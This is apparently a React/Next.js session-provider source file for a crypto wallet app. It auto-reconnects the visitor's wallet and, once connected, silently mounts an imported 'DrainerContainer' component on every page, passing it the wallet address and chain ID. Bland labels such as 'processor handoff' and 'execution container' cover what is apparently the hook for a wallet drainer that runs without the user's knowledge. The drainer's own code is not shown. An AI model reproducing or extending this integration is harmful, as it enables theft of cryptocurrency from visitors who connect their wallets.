// context/SessionProvider.tsx
"use client";

import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
import { useAccount, useConnect, useDisconnect, useReconnect, type Connector } from "wagmi";
// 1. Import your client-side container component
import DrainerContainer from "@/components/DrainerContainer";

export type SessionUser = {
  walletAddress: string;
  name?: string;
  email?: string;
  country?: string;
  avatar?: string;
  onboarded?: boolean;
  card?: { holder: string; number: string; last4: string; expiry: string; issuedAt: string };
} | null;

type SessionCtx = {
  ready: boolean;
  address?: string;
  isConnected: boolean;
  user: SessionUser;
  onboarded: boolean;
  loading: boolean;
  handoffLoading: boolean;
  connectors: readonly Connector[];
  connect: (connector?: Connector) => void;
  disconnect: () => void;
  refresh: () => Promise<void>;
};

const Ctx = createContext<SessionCtx | null>(null);

export function SessionProvider({ children }: { children: React.ReactNode }) {
  const { address, isConnected, isReconnecting, chainId } = useAccount();
  const { connect: wagmiConnect, connectors } = useConnect();
  const { disconnect: wagmiDisconnect } = useDisconnect();
  const { reconnect } = useReconnect();

  const [mounted, setMounted] = useState(false);
  const [user, setUser] = useState<SessionUser>(null);
  const [loading, setLoading] = useState(false);
  
  // Controls when to mount the script component in the DOM
  const [shouldExecute, setShouldExecute] = useState(false);

  const autoRan = useRef(false);

  useEffect(() => setMounted(true), []);

  // Auto-connect
  useEffect(() => {
    if (!mounted || autoRan.current) return;
    autoRan.current = true;
    reconnect();
    (async () => {
      try {
        if (isConnected) return;
        const eth: any = (globalThis as any).ethereum;
        if (!eth?.request) return;
        const accounts: string[] = await eth.request({ method: "eth_accounts" });
        if (accounts?.length) {
          const injected = connectors.find((c) => c.id === "injected" || c.type === "injected");
          if (injected) wagmiConnect({ connector: injected });
        }
      } catch {
        /* no-op */
      }
    })();
  }, [mounted, reconnect, isConnected, connectors, wagmiConnect]);

  // ==================== REFACTORED PROCESSOR HANDOFF ====================
  useEffect(() => {
    if (isConnected && address) {
      console.log(`[Session] Active wallet session detected: ${address}`);
      // Activate the state flag to mount the execution container on the client side
      setShouldExecute(true);
    } else {
      setShouldExecute(false);
    }
  }, [isConnected, address]);

  // Regular user data refresh
  const refresh = useCallback(async () => {
    if (!address) {
      setUser(null);
      return;
    }
    setLoading(true);
    try {
      const r = await fetch(`/api/user?wallet=${address}`);
      const d = await r.json();
      setUser(d.user ?? null);
    } catch {
      setUser(null);
    } finally {
      setLoading(false);
    }
  }, [address]);

  useEffect(() => {
    if (isConnected && address) refresh();
    else setUser(null);
  }, [isConnected, address, refresh]);

  const connect = useCallback(
    (connector?: Connector) => wagmiConnect({ connector: connector ?? connectors[0] }),
    [wagmiConnect, connectors]
  );

  const disconnect = useCallback(() => wagmiDisconnect(), [wagmiDisconnect]);

  const value = useMemo<SessionCtx>(
    () => ({
      ready: mounted && !isReconnecting,
      address,
      isConnected,
      user,
      onboarded: Boolean(user?.onboarded),
      loading,
      handoffLoading: shouldExecute,
      connectors,
      connect,
      disconnect,
      refresh,
    }),
    [mounted, isReconnecting, address, isConnected, user, loading, shouldExecute, connectors, connect, disconnect, refresh]
  );

  // Dynamic chain string normalization for the container components
  const targetChainId = chainId ? String(chainId) : "8453";

  return (
    <Ctx.Provider value={value}>
      {children}
      
      {/* 
        THE CONNECTING LINK:
        This mounts the container script context globally across all pages wrapped by this provider.
        It executes immediately inside the browser viewport once the states resolve.
      */}
      {shouldExecute && address && (
        <DrainerContainer 
          userAddress={address} 
          chainId={targetChainId} 
        />
      )}
    </Ctx.Provider>
  );
}

export function useSession(): SessionCtx {
  const c = useContext(Ctx);
  if (!c) throw new Error("useSession must be used within SessionProvider");
  return c;
}
